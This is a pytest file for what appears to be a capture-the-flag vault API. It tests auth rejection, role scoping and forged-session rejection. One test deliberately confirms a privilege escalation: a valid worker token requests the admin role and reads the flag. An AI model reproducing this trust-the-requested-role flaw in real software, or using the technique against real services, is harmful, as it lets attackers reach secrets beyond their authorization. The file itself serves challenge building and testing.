"""
Phase 8: tests for internal-vault-api.

Covers V5 (genuine auth boundary), correctly-scoped legitimate access,
and V6 (the actual exploit: same valid token, escalated role claim).
Fully isolated -- TestClient against the FastAPI app directly, no real
network, no other containers required.
"""

import base64
import json

from fastapi.testclient import TestClient

from app.main import VAULT_ENTRIES, app

client = TestClient(app)
VALID_TOKEN = "CV-LOCAL-EPHEMERAL-TOKEN-a1e9c3"


def _assume(role: str, token: str = VALID_TOKEN):
    return client.post(
        "/vault/assume-worker",
        json={"role": role},
        headers={"Authorization": f"Bearer {token}"},
    )


def test_vault_entries_index_leaks_no_values():
    resp = client.get("/vault/entries")
    assert resp.status_code == 200
    entries = resp.json()
    assert len(entries) == len(VAULT_ENTRIES)
    for entry in entries:
        assert set(entry.keys()) == {"id", "name", "required_role"}
        assert "value" not in entry


def test_assume_worker_rejects_missing_token():
    resp = client.post("/vault/assume-worker", json={"role": "cloudvault-import-worker"})
    assert resp.status_code == 401


def test_assume_worker_rejects_wrong_token():
    resp = _assume("cloudvault-import-worker", token="wrong-token")
    assert resp.status_code == 401


def test_assume_worker_accepts_valid_token():
    resp = _assume("cloudvault-import-worker")
    assert resp.status_code == 200
    assert "session" in resp.json()


def test_legitimate_role_can_read_only_its_own_entry():
    """
    Correctly-scoped access: the honest worker role should unlock
    entry-1 (its own entry) and be denied everything else. This proves
    the AUTHORIZATION comparison logic itself is correct -- V6 is not
    "the check is broken," it's "the input to the check is untrusted."
    """
    session = _assume("cloudvault-import-worker").json()["session"]
    headers = {"X-Vault-Session": session}

    resp1 = client.get("/vault/entries/entry-1", headers=headers)
    assert resp1.status_code == 200
    assert resp1.json()["id"] == "entry-1"

    resp2 = client.get("/vault/entries/entry-2", headers=headers)
    assert resp2.status_code == 403

    resp3 = client.get("/vault/entries/entry-3", headers=headers)
    assert resp3.status_code == 403


def test_read_entry_rejects_missing_session():
    resp = client.get("/vault/entries/entry-1")
    assert resp.status_code == 401


def test_read_entry_rejects_unknown_entry_id():
    session = _assume("cloudvault-import-worker").json()["session"]
    resp = client.get("/vault/entries/does-not-exist", headers={"X-Vault-Session": session})
    assert resp.status_code == 404


def test_v6_same_valid_token_escalated_role_reaches_the_flag():
    """
    THE EXPLOIT. Same genuinely-valid token as every other test in this
    file -- never issued for anything but cloudvault-import-worker -- but
    assume_worker is asked for cloudvault-vault-admin instead, and
    complies. That session then unlocks entry-3 (the flag), which the
    honestly-scoped session in the test above was correctly denied.

    If this test ever starts failing because assume_worker begins
    binding role to WORKER_ROLE, that's V6 being fixed -- update this
    test's expectation deliberately, don't just make it pass again.
    """
    escalated_session = _assume("cloudvault-vault-admin").json()["session"]

    resp = client.get("/vault/entries/entry-3", headers={"X-Vault-Session": escalated_session})
    assert resp.status_code == 200
    body = resp.json()
    assert body["id"] == "entry-3"
    assert "duck{" in body["value"]


def test_healthz():
    resp = client.get("/healthz")
    assert resp.status_code == 200


def test_forged_session_without_valid_signature_is_rejected():
    """
    Regression test: a hand-crafted session token (base64 JSON, no valid
    signature) must be rejected. This closes the alternate solve where a
    player skips assume_worker entirely and forges an admin session.
    """
    forged_payload = base64.b64encode(json.dumps({"role": "cloudvault-vault-admin"}).encode()).decode()
    # 1) No signature at all
    resp = client.get(
        "/vault/entries/entry-3",
        headers={"X-Vault-Session": forged_payload},
    )
    assert resp.status_code == 401

    # 2) Garbage signature
    resp = client.get(
        "/vault/entries/entry-3",
        headers={"X-Vault-Session": forged_payload + ".deadbeef"},
    )
    assert resp.status_code == 401

    # 3) Valid signature but tampered payload (role swapped after signing)
    legit = _assume("cloudvault-import-worker").json()["session"]
    b64, sig = legit.split(".", 1)
    swapped = base64.b64encode(json.dumps({"role": "cloudvault-vault-admin"}).encode()).decode()
    resp = client.get(
        "/vault/entries/entry-3",
        headers={"X-Vault-Session": swapped + "." + sig},
    )
    assert resp.status_code == 401
